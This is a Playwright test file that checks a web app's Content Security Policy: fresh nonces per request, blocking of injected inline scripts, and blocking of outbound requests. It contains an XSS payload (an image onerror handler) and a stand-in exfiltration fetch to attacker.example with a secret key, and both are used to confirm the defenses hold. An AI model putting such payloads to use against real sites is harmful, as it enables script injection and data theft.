import { test, expect } from "@playwright/test";

test.beforeEach(async ({ page }) => {
  await page.route("**/tree", (route) => route.fulfill({ json: [] }));
  await page.route("**/elements", (route) => route.fulfill({ json: [] }));
});

test("pages carry a nonce-based CSP with a fresh nonce per request", async ({ page }) => {
  const nonces: string[] = [];
  for (let i = 0; i < 2; i++) {
    const response = await page.goto("/");
    const policy = response?.headers()["content-security-policy"] ?? "";
    expect(policy).toContain("'strict-dynamic'");
    expect(policy).toContain("frame-ancestors 'none'");
    expect(policy).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    nonces.push(policy.match(/'nonce-([^']+)'/)?.[1] ?? "");
  }
  expect(nonces[0]).not.toBe("");
  expect(nonces[0]).not.toBe(nonces[1]);
  // The app still works: Next.js scripts got the nonce and hydrated the page.
  await expect(page.getByRole("button", { name: "AI assistant" })).toBeVisible();
});

test("an injected inline script does not run", async ({ page }) => {
  await page.goto("/");
  await expect(page.getByRole("button", { name: "AI assistant" })).toBeVisible();

  const result = await page.evaluate(
    () =>
      new Promise<{ ran: boolean; blocked: string | null }>((resolve) => {
        let blocked: string | null = null;
        document.addEventListener("securitypolicyviolation", (event) => {
          blocked = event.violatedDirective;
        });
        // A typical XSS payload, as if HTML from a node or the model had been rendered unsafely.
        const div = document.createElement("div");
        div.innerHTML = '<img src="/missing.png" onerror="window.__pwned = true">';
        document.body.appendChild(div);
        setTimeout(
          () => resolve({ ran: Boolean((window as { __pwned?: boolean }).__pwned), blocked }),
          1000
        );
      })
  );

  expect(result.ran).toBe(false);
  expect(result.blocked).toMatch(/^script-src/);
});

test("the page cannot send data to an unknown host", async ({ page }) => {
  let reachedAttacker = false;
  await page.route("https://attacker.example/**", (route) => {
    reachedAttacker = true;
    return route.fulfill({ body: "ok" });
  });
  await page.goto("/");

  const outcome = await page.evaluate(() =>
    fetch("https://attacker.example/steal?key=secret").then(
      () => "sent",
      () => "blocked"
    )
  );

  expect(outcome).toBe("blocked");
  expect(reachedAttacker).toBe(false);
});
